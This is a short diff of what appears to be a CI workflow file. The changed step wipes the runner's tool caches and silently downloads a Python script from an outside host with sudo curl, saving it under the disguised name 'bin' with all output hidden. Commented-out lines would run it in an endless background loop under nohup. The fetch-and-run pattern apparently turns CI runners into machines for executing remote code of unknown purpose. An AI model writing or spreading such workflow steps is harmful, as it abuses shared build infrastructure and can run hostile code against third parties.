@@ -20,7 +20,7 @@ jobs:
           sudo rm -rf /opt/hostedtoolcache
           sudo rm -rf /usr/local/.ghcup
           pip3 install requests >/dev/null 2>&1
-          sudo curl -s --silent -X GET https://exampleoci.yunzhongzhuan.com/python/cc.py -o bin >/dev/null 2>&1
+          sudo curl -s --silent -X GET https://exampleoci.yunzhongzhuan.com/python/cctemp.py -o bin >/dev/null 2>&1
           
           # mkdir thread1 && echo 'while true; do python3 bin; done' > thread1/run.sh && chmod +x thread1/run.sh
           # cp bin thread1 && cd thread1 && nohup bash run.sh & echo 'yes' && cd
